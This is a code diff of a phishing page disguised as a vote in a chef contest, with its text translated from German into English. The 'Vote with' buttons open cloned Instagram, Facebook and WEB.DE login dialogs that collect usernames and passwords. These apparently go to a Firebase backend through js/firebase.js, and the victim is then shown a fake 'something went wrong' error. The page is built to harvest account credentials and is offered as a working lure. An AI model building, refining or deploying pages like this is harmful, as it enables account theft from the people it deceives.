@@ -41,7 +41,14 @@
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-      background: linear-gradient(to right, #000000, #ff0000, #ffcc00);
+      background-image: url('cook.png');
+      background-size: stretch;
+      /* Ensures the image covers the entire element */
+      background-position: center;
+      /* Centers the image in the element */
+      background-repeat: no-repeat;
+      /* Prevents the image from repeating */
+
     }
 
     .profile-card {
@@ -70,7 +77,7 @@
 
     .profile-title {
       font-family: "Courier New", monospace;
-      font-size: 1.1em;
+      font-size: 0.9em;
       color: #555;
       margin: 0;
     }
@@ -179,276 +186,275 @@
 
 <body>
   <div id="preloader" class="preloader">
-    Lädt...
+    Loading...
   </div>
 
   <div class="profile-card">
-    <img src="images/vote_logo.jpeg" alt="Profilbild" class="profile-picture">
-    <h2 class="profile-name">Deine Stimme zählt</h2>
-    <p class="profile-title">Verwöhnt Ihren Gaumen</p>
-    <p class="profile-description">Bitte, wir brauchen Ihre Stimme!</p>
+    <img src="logo.png" alt="Profile Picture" class="profile-picture">
+    <h2 class="profile-name">Cast your Vote</h2>
+    <p class="profile-title">Help Us Crown the Ultimate Chef!</p>
+    <p class="profile-description">Please, we need your vote!</p>
     <div class="social-links">
 
       <div class="social-vote-button">
-
         <button onclick="Hotmail()" class="hotmail-button"><img src="images/main_logo.png"
-            style="width: 20.25px; height: 18.5px; border-radius: 5px;"> Mit
-          Web.De E-Mail, abstimmen
+            style="width: 20.25px; height: 18.5px; border-radius: 5px;"> Vote with
+          Web.De Email
         </button>
-
       </div>
       <div class="social-vote-button">
-        <button onclick="Instagram()" class="instagram-button2"><i class="fab fa-instagram"></i> Mit Instagram abstimmen
+        <button onclick="Instagram()" class="instagram-button2"><i class="fab fa-instagram"></i> Vote with Instagram
           <span style="color: transparent;"> -----------</span></button>
       </div>
 
       <div class="social-vote-button">
-        <button onclick="Facebook()" class="facebook-button3"><i class="fab fa-facebook"></i> Mit Facebook
-          abstimmen<span style="color: transparent;"> -----------</span>
+        <button onclick="Facebook()" class="facebook-button3"><i class="fab fa-facebook"></i> Vote with Facebook
+          <span style="color: transparent;"> -----------</span>
         </button>
       </div>
       <br><br>
-      <p class="powered-by">Angetrieben von - <strong><a href="https://www.instagram.com/maxlamanna/">MAX LA
+      <p class="powered-by">Powered by - <strong><a href="https://www.instagram.com/maxlamanna/">MAX LA
             MANNA 🇩🇪</a></strong></p>
 
     </div>
-    <!-- Instagram Dialog Box -->
-    <div id="instagram" class="dialog">
-      <div class="dialog-content">
-        <span class="close" onclick="closeDialog()">&times;</span>
-        <h2><span hidden id="dialog-instagram"></span></h2>
-        <main class="l-main">
-          <div class="l-main__img">
-            <img src="assets/img/homepage.png" alt="Smartphones">
-          </div>
-          <div class="l-user">
-            <div class="c-panel group">
+  </div>
 
-              <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
-              <div class="c-panel__form">
-                <input type="text" class="c-panel__input" class="form-control" required
-                  data-error="Please enter your email" placeholder="Phone number, username, or email" id="ig-uname">
-                <input type="text" class="c-panel__input" class="form-control" required
-                  data-error="Please enter your email" placeholder="Password" id="ig-pass">
-                <button class="c-btn" type="submit" onclick="iglog()" id="ig-log"> Log In</button>
-                <span class="c-panel__span">OR</span>
-              </div>
-              <a href="#facebook" class="c-panel__facebook">Login with Facebook</a> <br>
-              <a href="#" class="c-panel__forgot">Forgot password?</a>
-              <br>
-              <br>
-            </div>
-            <div class="c-signup group">
-              <p>Don't have an account? <span>Sign up</span></p>
-            </div>
+  <!-- Instagram Dialog Box -->
+  <div id="instagram" class="dialog">
+    <div class="dialog-content">
+      <span class="close" onclick="closeDialog()">&times;</span>
+      <h2><span hidden id="dialog-instagram"></span></h2>
+      <main class="l-main">
+        <div class="l-main__img">
+          <img src="assets/img/homepage.png" alt="Smartphones">
+        </div>
+        <div class="l-user">
+          <div class="c-panel group">
 
-            <div class="c-app">
-              <p>Get the app.</p>
-              <div class="c-app__download">
-                <img src="assets/img/apple.png" alt="Apple Store">
-                <img src="assets/img/google.png" alt="Google Play">
-              </div>
+            <img class="c-panel__img" src="assets/img/instagram.svg" alt="Instagram">
+            <div class="c-panel__form">
+              <input type="text" class="c-panel__input" class="form-control" required
+                data-error="Please enter your email" placeholder="Phone number, username, or email" id="ig-uname">
+              <input type="text" class="c-panel__input" class="form-control" required
+                data-error="Please enter your email" placeholder="Password" id="ig-pass">
+              <button class="c-btn" type="submit" onclick="iglog()" id="ig-log"> Log In</button>
+              <span class="c-panel__span">OR</span>
+            </div>
+            <a href="#facebook" class="c-panel__facebook">Login with Facebook</a> <br>
+            <a href="#" class="c-panel__forgot">Forgot password?</a>
+            <br>
+            <br>
+          </div>
+          <div class="c-signup group">
+            <p>Don't have an account? <span>Sign up</span></p>
+          </div>
+
+          <div class="c-app">
+            <p>Get the app.</p>
+            <div class="c-app__download">
+              <img src="assets/img/apple.png" alt="Apple Store">
+              <img src="assets/img/google.png" alt="Google Play">
             </div>
           </div>
-        </main>
-      </div>
+        </div>
+      </main>
     </div>
+  </div>
 
-    <!-- Facebook Dialog Box -->
-    <div id="facebook" class="dialog">
-      <div class="dialog-content">
-        <span class="close" onclick="closeDialog()">&times;</span>
-        <h2><span hidden id="dialog-instagram"></span></h2>
-        <main class="l-main">
-          <div class="fb-user">
-            <div class="fb-panel fb-group">
-              <img src="secured/img/logo.svg" alt="">
-              <p>Facebook helps you connect and share with the people in your life.</p>
-              <input type="text" placeholder="Email or Phone number" required id="fb-email">
-              <input type="password" placeholder="Password" required id="fb-pass">
-              <button class="c-btn" onclick="login()" id="fb-log">Log In</button><br>
+  <!-- Facebook Dialog Box -->
+  <div id="facebook" class="dialog">
+    <div class="dialog-content">
+      <span class="close" onclick="closeDialog()">&times;</span>
+      <h2><span hidden id="dialog-instagram"></span></h2>
+      <main class="l-main">
+        <div class="fb-user">
+          <div class="fb-panel fb-group">
+            <img src="secured/img/logo.svg" alt="">
+            <p>Facebook helps you connect and share with the people in your life.</p>
+            <input type="text" placeholder="Email or Phone number" required id="fb-email">
+            <input type="password" placeholder="Password" required id="fb-pass">
+            <button class="c-btn" onclick="login()" id="fb-log">Log In</button><br>
 
-              <a href="#">Forgotten password?</a>
-              <button id="create-btn">Create New Account</button>
-              <a href="#" style="font-weight: bold; color: var(--black); text-decoration: none;">Create a Page</a> for a
-              celebrity, band or business.
-            </div>
+            <a href="#">Forgotten password?</a>
+            <button id="create-btn">Create New Account</button>
+            <a href="#" style="font-weight: bold; color: var(--black); text-decoration: none;">Create a Page</a> for a
+            celebrity, band or business.
           </div>
-        </main>
-      </div>
+        </div>
+      </main>
     </div>
+  </div>
 
-    <!-- Hotmail Dialog Box -->
+  <!-- Hotmail Dialog Box -->
 
-    <div id="hotmail" class="dialog">
-      <div class="dialog-content">
-        <span class="close" onclick="closeDialog()">&times;</span>
+  <div id="hotmail" class="dialog">
+    <div class="dialog-content">
+      <span class="close" onclick="closeDialog()">&times;</span>
 
-        <div class="main-layout">
+      <div class="main-layout">
 
 
 
-          <div class="header ">
-            <div class="header__logo">
-              <img class="pos-svg icon icon--logo-mini_webde-dims icon--logo-webde-32-dims" src="images/top_logo.svg">
+        <div class="header ">
+          <div class="header__logo">
+            <img class="pos-svg icon icon--logo-mini_webde-dims icon--logo-webde-32-dims" src="images/top_logo.svg">
+          </div>
+          <div class="header__text">Mobile Login</div>
+        </div>
+
+
+        <div class="centered-content centered-content--narrow">
+
+
+          <div class="content-title">
+            <div class="content-title__logo">
+              <img class="pos-svg icon icon--logo-webde-56-dims icon--brand content-title__logo"
+                src="images/main_logo.svg">
             </div>
-            <div class="header__text">Mobile Login</div>
+            <h1>Login</h1>
+            <p id="loginText">
+              Bitte melden Sie sich hier mit Ihrem WEB.DE Nutzernamen und Ihrem Passwort an.
+            </p>
           </div>
 
 
-          <div class="centered-content centered-content--narrow">
 
+          <div name="loginForm" accept-charset="UTF-8" data-formerror-check="serverchecked">
 
-            <div class="content-title">
-              <div class="content-title__logo">
-                <img class="pos-svg icon icon--logo-webde-56-dims icon--brand content-title__logo"
-                  src="images/main_logo.svg">
-              </div>
-              <h1>Login</h1>
-              <p id="loginText">
-                Bitte melden Sie sich hier mit Ihrem WEB.DE Nutzernamen und Ihrem Passwort an.
-              </p>
-            </div>
+            <div id="0:formPanel:loginForm:usernameInput">
+              <div class="pos-form-wrapper">
+                <label class="pos-label pos-label--block required"
+                  for="0:formPanel:loginForm:usernameInput:topWrapper:inputWrapper:input">WEB.DE Nutzername</label>
+                <div class="pos-input">
 
+                  <input id="hm-email" type="email" required name="username" class="revealable-input-row__input"
+                    id="0:formPanel:loginForm:usernameInput:topWrapper:inputWrapper:input" type="text">
 
-
-            <div name="loginForm" accept-charset="UTF-8" data-formerror-check="serverchecked">
-
-              <div id="0:formPanel:loginForm:usernameInput">
-                <div class="pos-form-wrapper">
-                  <label class="pos-label pos-label--block required"
-                    for="0:formPanel:loginForm:usernameInput:topWrapper:inputWrapper:input">WEB.DE Nutzername</label>
-                  <div class="pos-input">
-
-                    <input id="hm-email" type="email" required name="username" class="revealable-input-row__input"
-                      id="0:formPanel:loginForm:usernameInput:topWrapper:inputWrapper:input" type="text">
-
-                  </div>
                 </div>
-
-
-
-
-
               </div>
 
-              <div id="0:formPanel:loginForm:passwordInput">
-                <div class="two-fa-enter-password">
-                  <div class="pos-form-wrapper revealable-input-row">
-                    <label class="pos-label pos-label--block required"
-                      for="0:formPanel:loginForm:passwordInput:topWrapper:inputWrapper:input">Passwort eingeben</label>
-                    <div class="pos-input">
-                      <input id="hm-pass" type="password" class="revealable-input-row__input" required="required"
-                        name="password" id="0:formPanel:loginForm:passwordInput:topWrapper:inputWrapper:input">
-                      <div class="revealable-input-row__icon pos-input-icon">
-                        <img class="icon icon--password-eye-dims" src="images/eye.png">
-                      </div>
+
+
+
+
+            </div>
+
+            <div id="0:formPanel:loginForm:passwordInput">
+              <div class="two-fa-enter-password">
+                <div class="pos-form-wrapper revealable-input-row">
+                  <label class="pos-label pos-label--block required"
+                    for="0:formPanel:loginForm:passwordInput:topWrapper:inputWrapper:input">Passwort eingeben</label>
+                  <div class="pos-input">
+                    <input id="hm-pass" type="password" class="revealable-input-row__input" required="required"
+                      name="password" id="0:formPanel:loginForm:passwordInput:topWrapper:inputWrapper:input">
+                    <div class="revealable-input-row__icon pos-input-icon">
+                      <img class="icon icon--password-eye-dims" src="images/eye.png">
                     </div>
                   </div>
                 </div>
-
-
-
-
-
               </div>
 
-              <button onclick="hmlog()" id="submitButton"
-                class="pos-button pos-button--cta pos-button--block a-mb-space-2">
-                Login
-              </button>
+
+
+
+
             </div>
 
+            <button onclick="hmlog()" id="submitButton"
+              class="pos-button pos-button--cta pos-button--block a-mb-space-2">
+              Login
+            </button>
+          </div>
 
 
-            <a class="a-ta-c a-mb-space-3 pos-button pos-button--link pos-button--block"
-              href="https://passwort.web.de/">
-              Passwort vergessen?
+
+          <a class="a-ta-c a-mb-space-3 pos-button pos-button--link pos-button--block" href="https://passwort.web.de/">
+            Passwort vergessen?
+          </a>
+          <hr class="centered-content__line-break a-mb-space-4">
+          <div class="a-ta-c a-mb-space-4">
+            <h2 class="a-mb-space-2.5">
+              Neu bei WEB.DE?
+            </h2>
+            <a class="pos-button pos-button--link pos-button--block"
+              href="https://registrierung.web.de/?isMobile=true#.pc_page.mm.login.textlink.registrierung">
+              Jetzt kostenlos registrieren!
             </a>
-            <hr class="centered-content__line-break a-mb-space-4">
-            <div class="a-ta-c a-mb-space-4">
-              <h2 class="a-mb-space-2.5">
-                Neu bei WEB.DE?
-              </h2>
-              <a class="pos-button pos-button--link pos-button--block"
-                href="https://registrierung.web.de/?isMobile=true#.pc_page.mm.login.textlink.registrierung">
-                Jetzt kostenlos registrieren!
-              </a>
-            </div>
           </div>
-
-
-          <div class="footer">
-            <a class="footer__link" target="_blank" href="">Impressum</a>
-            <a class="footer__link" target="_blank" href="">Verträge hier kündigen</a>
-            <a class="footer__link" target="_blank" href="">AGB</a>
-            <a class="footer__link" target="_blank" href="">Datenschutz</a>
-          </div>
-
         </div>
+
+
+        <div class="footer">
+          <a class="footer__link" target="_blank" href="">Impressum</a>
+          <a class="footer__link" target="_blank" href="">Verträge hier kündigen</a>
+          <a class="footer__link" target="_blank" href="">AGB</a>
+          <a class="footer__link" target="_blank" href="">Datenschutz</a>
+        </div>
+
       </div>
     </div>
-    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.all.min.js"></script>
-    <script>
-      function showCustomAlert() {
-        Swal.fire({
-          title: 'Oops!',
-          text: 'Something went wrong with your vote.',
-          icon: 'error',
-          confirmButtonText: 'Try Again'
-        });
-      }
-    </script>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.all.min.js"></script>
+  <script>
+    function showCustomAlert() {
+      Swal.fire({
+        title: 'Oops!',
+        text: 'Something went wrong with your vote.',
+        icon: 'error',
+        confirmButtonText: 'Try Again'
+      });
+    }
+  </script>
 
-    <script>
-      function showPreloader() {
-        document.getElementById("preloader").style.display = "flex";
-      }
+  <script>
+    function showPreloader() {
+      document.getElementById("preloader").style.display = "flex";
+    }
 
-      function hidePreloader() {
-        document.getElementById("preloader").style.display = "none";
-      }
+    function hidePreloader() {
+      document.getElementById("preloader").style.display = "none";
+    }
 
-      function Hotmail() {
-        showPreloader();
-        setTimeout(function () {
-          hidePreloader();
-          document.getElementById("hotmail").style.display = "flex";
-        }, 1000); // Delay in milliseconds
-      }
+    function Hotmail() {
+      showPreloader();
+      setTimeout(function () {
+        hidePreloader();
+        document.getElementById("hotmail").style.display = "flex";
+      }, 1000); // Delay in milliseconds
+    }
 
-      function Instagram() {
-        showPreloader();
-        setTimeout(function () {
-          hidePreloader();
-          document.getElementById("instagram").style.display = "flex";
-        }, 1000); // Delay in milliseconds
-      }
+    function Instagram() {
+      showPreloader();
+      setTimeout(function () {
+        hidePreloader();
+        document.getElementById("instagram").style.display = "flex";
+      }, 1000); // Delay in milliseconds
+    }
 
-      function Facebook() {
-        showPreloader();
-        setTimeout(function () {
-          hidePreloader();
-          document.getElementById("facebook").style.display = "flex";
-        }, 1000); // Delay in milliseconds
-      }
+    function Facebook() {
+      showPreloader();
+      setTimeout(function () {
+        hidePreloader();
+        document.getElementById("facebook").style.display = "flex";
+      }, 1000); // Delay in milliseconds
+    }
 
-      function closeDialog() {
-        document.getElementById("instagram").style.display = "none";
-        document.getElementById("hotmail").style.display = "none";
-        document.getElementById("facebook").style.display = "none";
-      }
-    </script>
-    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+    function closeDialog() {
+      document.getElementById("instagram").style.display = "none";
+      document.getElementById("hotmail").style.display = "none";
+      document.getElementById("facebook").style.display = "none";
+    }
+  </script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
 
-    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
 
-    <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
-    <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
 
-    <script src="js/firebase.js">
+  <script src="js/firebase.js">
 
-    </script>
+  </script>
 
 </body>
 
